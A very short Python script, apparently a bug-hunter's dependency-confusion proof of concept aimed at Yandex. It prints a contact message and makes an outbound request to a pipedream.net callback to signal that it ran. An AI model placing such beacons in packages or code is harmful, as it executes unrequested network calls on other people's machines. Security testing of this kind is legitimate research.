import requests

#I am  bughunter
#t.a.neo@yandex.ru
print('If you read this message and you are from Yandex write me t.a.neo@yandex.ru')
requests.get("https://76c42f27d26091659dca820a37e6f5d3.m.pipedream.net/yc_as_client")
